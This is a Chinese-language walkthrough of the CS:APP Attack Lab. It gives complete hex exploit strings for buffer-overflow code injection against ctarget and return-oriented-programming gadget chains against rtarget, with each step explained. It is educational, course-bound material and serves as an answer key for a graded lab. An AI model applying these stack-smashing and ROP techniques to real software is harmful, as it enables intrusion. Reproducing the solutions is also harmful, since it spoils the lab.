# Attack Lab

在本实验中，实验者需要利用缓冲区攻击来破坏原有程序，以执行攻击者程序。本实验中可以进一步巩固汇编代码的阅读和分析能力，以及gdb工具的使用，并编写或组装自己的汇编代码。如果你独立完成了Bomb Lab的全部内容，本实验对于你来说应当不在话下。

### 实验目标及工具

本实验的目标是输入攻击字符串（exploit strings）以运行 `ctarget`和 `rtarget`，使得 `touch1` 、`touch2`、`touch3` 分别以规定的参数执行。需要注意的是，需要以 `-q` 参数执行程序，以取消对CMU内网服务器的上传。可以使用`-i`参数以文件形式传入攻击字符串。执行程序的命令示例如下：

`./ctarget -qi ctarget1-raw.txt`

对于攻击字符串的生成，可以利用 `hex2raw` 程序，该程序以空格或回车为分割的2位16进制数的字符串为输入，输出由值等于这些2位16进制数的字符组成的字符串，可以利用重定向操作生成所需攻击字符串文件：

`./hex2raw < ctarget1.txt > ctarget1-raw.txt`

当实验成功时，终端会产生如下的输出：

```
./rtarget -qi rtarget1-raw.txt
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A3 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

## part1：Code Injection Attacks

在实验的第一部分中，我们需要执行`ctarget`以规定的参数执行`touch1`、`touch2`、`touch3`。`ctarget`是一个没有随机化栈空间、限制可执行代码区域保护机制的不安全代码，因此对其的攻击会相对简单一些。

实现这一机制的方法在于函数`test`中：

```
1 void test()
2 { 
3 	int val;
4 	val = getbuf();
5 	printf("No exploit. Getbuf returned 0x%x\n", val);
6 }
```

其调用了不安全的`getbuf`函数，当缓冲区被破坏时，在`test`函数中压入栈帧的返回地址可以被替换为任意函数的入口地址，即`touch`函数的地址。使得控制流从`getbuf`返回至`touch`而非`test`。

在开始之前，我们需要利用 `objdump -d ctarget` 来寻找touch函数的地址，可以得到三个函数的地址分别为`touch1 : 0x4017c0` 、`touch2 : 0x4017ec`  、`touch3 : 0x4018fa`。

### phase1

作为实验的热身阶段，我们需要输入攻击字符串以执行touch1：

```
1 void touch1()
2 { 
3 	vlevel = 1; /* Part of validation protocol */ 
4 	printf("Touch1!: You called touch1()\n");
5 	validate(1);
6 	exit(0);
7 }
```

touch1的结构比较简单，其没有参数输入，仅需利用缓冲区破坏使得`test`压入栈帧的地址被替换为`touch1`即可。在这里我们需要知道`getbuf`的缓冲区大小，由`objdump -d ctarget`可以得到：

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 ac 03 00 00       	callq  401b60 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop

```

可以看出其缓冲区大小为`0x28`。当输入的字符串的大小超过40时，即可覆盖压入栈帧的返回地址，且覆盖后的返回地址即为字符串第41个元素为起始的与字符值对应的16进制数字序列。因此，我们可以构造如下的`ctarget1`文件以作为`hex2raw`的输入参数：

```
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00 /* 0x28 '/0' to fill the stack */
c0 17 40    /* the address of touch1 */
```

### phase2

在该部分，我们需要以特定的参数（cookie的16进制数值表示）执行`touch2`：

```
1 void touch2(unsigned val)
2 { 
3 	vlevel = 2; /* Part of validation protocol */ 
4 	if (val == cookie) {
5 		printf("Touch2!: You called touch2(0x%.8x)\n", val);
6 		validate(2);
7 	} else {
8 		printf("Misfire: You called touch2(0x%.8x)\n", val);
9 		fail(2);
10 	}
11 	exit(0);
12 }
```

通过对CSAPP的学习，我们可以知道当寄存器数量足够时，函数的参数是在寄存器中传递的，且第一个被使用的寄存器即为 `%rdi` 。因此，在本部分中，我们需要在缓冲区中插入汇编代码，使得cookie的数值表示被传入`%rdi`寄存器。

在这里我们可以直接编写汇编代码`ctarget2-help.s`，在编译后通过`objdump -d ctarget2-help.o > ctarget2-help.d`得到汇编代码相应的机器代码。

为了执行我们插入缓冲区的汇编代码，覆盖后的返回地址应当为缓冲区汇编代码的起始地址，并且在完成寄存器的赋值操作后，我们需要以某种方式使得控制流从缓冲区转移至`touch2`。在这里，我们可以通过`push <addr>`的方式在栈帧中压入`touch2`的入口地址，使得`%rsp`寄存器指向该地址，再调用`ret`返回至`touch2`。可以构造如下的hex文件`ctarget2.txt`：

```
48 c7 c7 fa 97 b9 59 /* movq $0x59b997fa,%rdi */
68 ec 17 40 00       /* push $0x4017ec (the address of touch2 is pointed by %rsp) */
c3                   /* ret */
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00 00
00 00 00
78 dc 61 55          /* address of movq */
```

### phase3

在本部分中，我们需要以字符串的形式cookie作为参数执行`touch3`：

```
1 /* Compare string to hex represention of unsigned value */ 
2 int hexmatch(unsigned val, char *sval)
3 { 
4 	char cbuf[110];
5 	/* Make position of check string unpredictable */ 6 char *s = cbuf + random() % 100;
7 	sprintf(s, "%.8x", val);
8 	return strncmp(sval, s, 9) == 0;
9 } 
10
11 void touch3(char *sval)
12 {
13 	vlevel = 3; /* Part of validation protocol */
14 	if (hexmatch(cookie, sval)) {
15 		printf("Touch3!: You called touch3(\"%s\")\n", sval);
16 		validate(3);
17 	} else {
18 		printf("Misfire: You called touch3(\"%s\")\n", sval);
19 		fail(3);
20 	}
21 	exit(0);
22 }
```

在这里我们需要在栈帧中存入cookie字符串，并给`%rdi`寄存器赋以栈帧中字符串的起始地址。值得注意的是，在`hexmatch`函数中分配了很大的缓冲区，因此我们保存cookie字符串的位置应当在栈帧的高地址处，以避免被该缓冲区覆盖。可以构造如下的hex文件`ctarget3`：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
48 c7 c7 b0 dc 61 55    /* movq $0x5561dcb0,%rdi (address of the cookie's string) */
68 fa 18 40 00          /* push $0x4018fa (the address of touch3 be pointed by %rsp) */
c3                      /* ret */
00 00 00
90 dc 61 55 00 00 00 00 /* the address of movq */
00 00 00 00 00 00 00 00
35 39 62 39 39 37 66 61 /* the cookie's string */
```

可以看到，我们将cookie字符串存放在栈帧的较高地址处，以避免其被覆盖。

## part2：Return-Oriented Programming

在本部分中，我们需要对保护机制比较完善的`rtarget`程序进行攻击，在此程序中应用了随机化栈空间和限制可执行代码段的保护机制，使得我们在栈帧中插入的汇编代码不能被执行。因此，我们需要利用一种叫做Return-Oriented Programming的方式进行攻击，其原理是利用程序中的原有部分的代码片段构造可用于攻击的小工具代码段（gadgets）。这种代码段的特点是其以`0xc3`即`ret`作为代码段的结尾，使得执行其后`%rsp`的值被加以8，而在此地址中，我们又可以安排下一段代码段，通过此方式即可构造我们所需的攻击代码。

![image-20211226142648509](https://github.com/jlu-xiurui/csapp-labs/blob/master/solution/lab3-attack/figure1.png)

值得注意的是，我们可以利用一段汇编代码中的一部分构造另外的汇编代码，例如：

`4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax`

在这段代码中，我们可以从0x4019a2处执行该代码片段，使得其变为如下的汇编代码：

```
4019a2 : 48 89 c7  /* movq %rax,%rdi
4019a5 : c3        /* retq
```

### phase4

在此部分中，我们需要利用`rtarget`执行phase2中相同的攻击，通过实验手册的提示，我们可以知道可以被利用的工具代码段（gadgets）位于`start_farm()`和`mid_farm()`之间。

首先，我们需要在这段代码区间中寻找可能有用的gadgets（为了表示简洁，在这里忽略了末尾的`ret`，但其是存在的）：

```
4019a2: movq %rax,%rdi
4019ab: popq  %rax
```

以上两个gadgets即为该区间中仅有的可能有用的代码片段。因此，为了使得cookie的数值表示传入`%rdi`，我们可以先利用`popq %rax`将栈帧中的数值传入`%rax`，再通过`movq %rax,%rdi`使得该值传入`%rdi`。因此，我们可以构造如下的hex文件`rtarget1`：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 /* popq %rax */
fa 97 b9 59 00 00 00 00 /* the hex of rookie to be pop into %rax */
a3 19 40 00 00 00 00 00 /* movq %rax,%rdi */
ec 17 40 00 00 00 00 00 /* the address of touch2 */
```

在这里，我讲解一下该代码的具体执行步骤以帮助理解：

* 首先，`getbuf`中调用`ret`返回至`0x4019ab`，在程序计数器`pc`指向`0x4019ab`的同时，`%rsp`中的数值加8并指向`fa 97 b9 59 00 00 00 00 `。

* 执行`popq %rax`操作，使得`%rsp`指向的数值被传入`%rax`，同时`%rsp`中的数值加8并指向`a3 19 40 00 00 00 00 00`，并且`pc`跳转至地址连续的下一指令`4019a5 : c3`，即`ret` 。

* 执行`ret`操作，`pc`跳转至`%rsp`所指向的地址，即`movq %rax,%rdi`。

* 执行`movq %rax,%rdi`并使`%rsp`指向`touch2`的入口地址，并使得`pc`跳转至`ret`。

* 调用`ret`使得控制流进入`touch2`。  

  

### phase5

在此部分中，我们需要利用`rtarget`执行phase3中相同的攻击，通过实验手册的提示，我们可以知道可以被利用的工具代码段（gadgets）位于`start_farm()`和`end_farm()`之间。

同样的，我们我们需要在这段代码区间中寻找可能有用的gadgets：

```
401a06 : movq %rsp,%rax
4019a2 : movq %rax,%rdi
4019ab : popq %rax
401a86 : movl %esp,%eax
401a42 : movl %eax,%edx
401a34 : movl %edx,%ecx
401a13 : movl %ecx,%esi
```

值得注意的是，我们除了代码片段中的一部分可能有用，整个代码片段也可能是有用的（这一点困扰了我很长时间）。很关键的一段代码如下：

```
4019d6 : leaq(%rdi,%rsi,1),%rax
```

通过`leaq`操作，我们即可实现加法操作，从而构造由`%rsp`作为基址，一个由`popq %rax`传入的数值作为偏移地址的cookie字符串地址，我们可以构造如下的hex文件`rtarget2`：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00  /* movq %rsp,%rax (base address) */
a2 19 40 00 00 00 00 00  /* movq %rax,%rdi  */
ab 19 40 00 00 00 00 00  /* popq %rax  */
48 00 00 00 00 00 00 00  /* the num pop to %rax  */
42 1a 40 00 00 00 00 00  /* movl %eax,%edx */
34 1a 40 00 00 00 00 00  /* movl %edx,%ecx */
13 1a 40 00 00 00 00 00  /* movl %ecx,%esi */
d6 19 40 00 00 00 00 00  /* leaq (%rdi,%rsi,1),%rax */
a2 19 40 00 00 00 00 00  /* movq %rax,%rdi */
fa 18 40 00 00 00 00 00  /* address of touch3 */
35 39 62 39 39 37 66 61  /* the cookie (its address is equal to 'base address + 0x48' */
00
```

上述文件所代表的操作如下：

* 与phase3相同，我们需要在栈帧高地址处保存cookie字符串

* 利用`movq %rsp,$rax`和`movq %rax,%rdi`以保存栈指针的当前地址至`%rdi`。
* 利用`popq %rax`操作使得栈帧中的数值被传入`%rax`，然后通过一系列的`movl`操作使得该值被传递至`%esi`。
* 利用`leaq(%rdi,%rsi,1),%rax`构造偏移地址，即rookie字符串的起始地址，并利用`movq %rax,%rdi`使得该地址被传入`%rdi`。
* 返回至`touch3`。







